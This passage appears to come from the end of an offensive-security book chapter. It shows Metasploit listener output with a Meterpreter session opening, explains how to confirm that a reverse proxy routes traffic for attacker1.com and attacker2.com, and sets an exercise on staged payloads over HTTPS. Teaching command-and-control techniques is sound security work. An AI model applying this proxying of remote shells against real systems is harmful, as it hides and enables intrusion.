connection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-3UdLhACr8-Qt6QOlOw&#13;
PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA 'Mozilla/5.0 (Windows NT 6.1;&#13;
Trident/7.0;&#13;
rv:11.0) like Gecko'&#13;
[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Attaching&#13;
orphaned/stageless session...&#13;
[*] Meterpreter session 1 opened (10.0.1.20:10080 -&gt; 10.0.1.20:60226) at 2020-07-03 16:13:34 -0500</pre>&#13;
<p class="indent">If you use tcpdump or Wireshark to inspect network traffic destined for port 10080 or 20080, you should see that your reverse proxy is the only host communicating with the Metasploit listener. You can also confirm that the <span class="literal">Host</span> header is set appropriately to <span class="literal">attacker1.com</span> (for the listener on port 10080) and <span class="literal">attacker2.com</span> (for the listener on port 20080).</p>&#13;
<p class="indent">That’s it. You’ve done it! Now, take it up a notch. As an exercise for you, we recommend you update the code to use a staged payload. This likely comes with additional challenges, as you’ll need to ensure that both stages are properly routed through the proxy. Further, try to implement it by using HTTPS instead of cleartext HTTP. This will further your understanding and effectiveness at proxying traffic in useful, nefarious ways.</p>&#13;
<h3 class="h3" id="ch4lev1sec5">Summary</h3>&#13;
<p class="noindent">You’ve completed your journey of HTTP, working through both client and server implementations over the last two chapters. In the next chapter, you’ll focus on DNS, an equally useful protocol for security practitioners. In fact, you’ll come close to replicating this HTTP multiplexing example using DNS.</p>&#13;
</div>



  </body></html>